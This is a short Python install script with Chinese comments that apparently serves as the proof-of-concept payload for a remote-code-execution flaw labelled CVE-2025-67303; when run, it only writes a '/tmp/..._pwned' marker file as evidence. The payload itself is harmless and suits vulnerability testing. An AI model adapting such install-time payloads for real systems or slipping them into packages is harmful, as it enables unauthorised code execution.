# 文件名：install.py
import subprocess
import os

# 在 /tmp 目录创建一个标记文件
def create_marker():
    marker_file = "/tmp/cve_2025_67303_pwned"
    try:
        with open(marker_file, 'w') as f:
            f.write("RCE successful via CVE-2025-67303\n")
        # 同时改变文件修改时间作为额外证据
        os.utime(marker_file, None)
        print(f"[+] Marker file created at {marker_file}")
    except Exception as e:
        print(f"[-] Failed to create marker: {e}")

if __name__ == "__main__":
    create_marker()